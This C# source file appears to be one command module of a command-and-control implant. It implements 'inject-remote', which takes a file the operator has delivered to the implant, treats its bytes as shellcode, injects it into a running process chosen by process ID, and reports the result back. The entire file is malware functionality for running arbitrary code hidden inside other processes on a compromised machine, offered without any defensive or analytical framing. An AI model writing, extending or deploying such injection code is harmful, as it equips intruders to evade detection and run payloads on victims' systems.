using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class RemoteInjectCommand : AgentCommand
    {
        public override string Name => "inject-remote";

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            this.CheckFileDownloaded(task, context);

            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            var fileContent = file.GetFileContent();

            var shellcode = fileContent;

            int processId = int.Parse(task.SplittedArgs[0]);

            var process = Process.GetProcessById(processId);
            if (process == null)
            {
                context.Result.Result = $"Unable to find process with Id {processId}";
                return;
            }

            var injectRes = Injector.Inject(process, shellcode);
            if (!injectRes.Succeed)
                context.Result.Result += $"Injection failed : {injectRes.Error}";
            else
            {
                context.Result.Result += $"Injection succeed!" + Environment.NewLine;
                if (!string.IsNullOrEmpty(injectRes.Output))
                    context.Result.Result += injectRes.Output;
            }
        }
    }
}
